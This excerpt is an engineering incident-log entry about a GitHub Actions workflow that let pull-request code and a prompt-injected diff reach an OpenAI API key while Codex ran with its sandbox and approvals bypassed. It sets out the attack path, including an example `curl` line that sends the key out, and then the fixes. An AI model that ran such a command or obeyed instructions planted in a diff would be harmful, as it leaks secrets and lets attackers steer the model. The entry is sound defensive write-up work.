...
## 2026-06-25 — Codex PR-review workflow exposed OPENAI_API_KEY to PR-controlled execution

**PR:** [#237](https://github.com/CT2689-Tech/DeclutrMail/pull/237)
**Caught by:** Codex stop-time review gate (the very gate enabled in this same PR — it fired on session end and blocked with "PR review workflow exposes secrets to PR-controlled execution").
**What happened:** The first cut of `.github/workflows/codex-review.yml` ran on `pull_request` with `OPENAI_API_KEY` in the env of a step that (a) executed `.github/codex/run-adversarial-review.mjs` *from the PR's own checkout* — a malicious same-repo branch could rewrite that script to exfiltrate the key — and (b) ran `codex exec --dangerously-bypass-approvals-and-sandbox` over the attacker-controlled PR diff, so a prompt-injection in the diff could make Codex run `curl …?k=$OPENAI_API_KEY`. (Fork PRs were already safe: `pull_request` withholds secrets from forks, so the guard no-ops them.)
**Correct approach:** (1) restrict the job to same-repo PRs (`head.repo.full_name == github.repository`); (2) execute ONLY the TRUSTED base-ref copy of the helper (`git show origin/$BASE:…`), never the PR's working-tree copy — and when base lacks it (the introducing PR), **skip** rather than fall back to PR-head code (the first hardening pass kept a `cp` fallback; the stop-gate caught that it still ran PR-head code with the secret, so it was replaced with a fail-safe skip gated by a `ran` output); (3) drop the sandbox bypass — run `codex exec -c sandbox_mode=read-only -c approval_policy=never` so an injected diff cannot drive command execution. Verified locally that sandboxed codex still returns the review JSON.
**Rule:** A workflow that holds a secret AND processes PR-controlled content must never execute code or tools sourced from the PR head. Run secret-bearing steps from the trusted base ref, sandbox any LLM/tool over untrusted input, and gate to same-repo. Treat the PR diff as attacker-controlled text even on a solo repo.
**Enforcement update:** Hardened `codex-review.yml` in the same PR. The `.claude/hooks/security_reminder_hook.py` PreToolUse reminder already fires on workflow edits; the new failure mode (secret + PR-head code execution) is now captured here for the distill loop. CLAUDE.md §10 candidate if it recurs.
